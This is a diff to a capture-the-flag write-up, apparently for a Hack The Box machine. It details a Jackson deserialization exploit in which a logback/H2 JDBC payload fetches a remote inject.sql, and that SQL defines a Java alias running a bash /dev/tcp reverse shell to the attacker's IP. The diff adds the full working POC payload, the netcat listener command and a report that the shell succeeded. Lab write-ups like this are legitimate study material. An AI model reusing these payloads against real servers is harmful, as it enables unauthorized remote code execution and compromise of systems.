@@ -55,7 +55,7 @@ priority: 2
 2. Get ready your bash shell execution for the reverse shell [(CALL SHELLEXEC('bash -i &>/dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1 &'))].
 3. Fired up your http server for port 8000 to upload inject.sql for our attacking box (Time).
 4. Make your listner ready for the reverse shell.
-5. Use the POC payload with YOUR_MACHINE_IP on port 8000.
+5. Use the POC payload with YOUR_MACHINE_IP on port 8000 in Validate (Beta!).
 6. BOOOM, you got reverse shell.
 
 **inject.sql**
@@ -67,14 +67,30 @@ CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOExcep
 $$;
 CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.16.11/1234 0>&1 &')
 ```
-**Firing up our http server**
+**Firing up our http server..**
 
 ![](https://i.ibb.co/synM0x0/image.png)
 
-**Netcat as our listner ```yahia@Y4h1a:~$ nc -nlvp 1234 ```**
-![]()
-![]()
-![]()
+**Netcat as our listner ```yahia@Y4h1a:~$ nc -nlvp 1234 ```...**
+
+**POC payload..**
+```php
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.16.11:8000/inject.sql'"}]
+```
+**Here** 
+
+![](https://i.ibb.co/nc1pGwZ/image.png)
+
+**Looking to http server we found GET /inject.sql is 200 and that's OK.**
+
+![](https://i.ibb.co/dtjG5BM/image.png)
+
+**Our listner..*
+![](https://i.ibb.co/XshCJMZ/image.png)
+
+> * We got reverse shell successfully.
+
+
 ![]()
 ![]()
 ![]()
